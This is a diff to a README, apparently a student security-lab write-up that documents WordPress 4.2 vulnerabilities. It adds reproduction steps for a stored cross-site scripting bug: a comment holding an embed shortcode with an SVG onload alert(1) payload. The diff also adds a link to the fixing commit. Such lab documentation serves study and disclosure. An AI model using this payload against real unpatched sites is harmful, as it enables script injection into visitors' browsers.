@@ -24,9 +24,10 @@ Time spent: **5** hours spent in total
     - Tested in version: 4.2
     - Fixed in version: 4.2.13
   - [x] GIF Walkthrough: <img src="week7_2.gif" width="800">
-  - [ ] Steps to recreate: 
+  - [x] Steps to recreate: Post comment with 
+        `[embed src='https://www.youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]`
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
 
 
 3. (Required) Vulnerability Name or ID
